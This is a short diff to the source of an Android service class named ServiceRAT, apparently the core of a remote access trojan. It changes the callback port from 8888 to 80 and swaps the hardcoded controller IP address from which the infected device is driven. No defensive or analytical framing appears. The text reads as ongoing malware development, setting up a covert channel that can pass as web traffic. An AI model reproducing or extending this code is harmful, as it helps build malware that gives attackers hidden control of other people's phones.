@@ -12,7 +12,7 @@ import android.widget.Toast;
 
 public class ServiceRAT extends IntentService {
     private String hostname;
-    private static final int portnumber = 8888;
+    private static final int portnumber = 80;
 
     public ServiceRAT() {
         super("ServiceRAT");
@@ -55,6 +55,6 @@ public class ServiceRAT extends IntentService {
         }
         System.out.println("ip " + hostname);
         //Client client = new Client(hostname, portnumber, this);
-        Client client = new Client("192.168.1.35", portnumber, this);
+        Client client = new Client("192.168.1.47", portnumber, this);
     }
 }
